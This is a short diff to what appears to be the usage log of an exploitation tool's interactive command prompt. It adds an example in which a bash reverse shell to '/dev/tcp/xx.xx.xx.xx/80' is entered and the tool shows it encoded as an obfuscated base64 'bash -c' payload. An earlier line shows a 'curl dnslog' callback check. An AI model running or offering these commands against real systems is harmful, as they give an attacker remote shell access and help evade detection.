@@ -40,6 +40,9 @@
 curl dnslog.xxx.com
 [-] start process command: curl dnslog.xxx.com
 [-] please enter command, input q or quit to quit
+bash=bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
+[-] start process command: bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eC84MCAwPiYx}|{base64,-d}|{bash,-i}
+[-] please enter command, input q or quit to quit
 quit
 [-] start process command: quit
 [-] exit
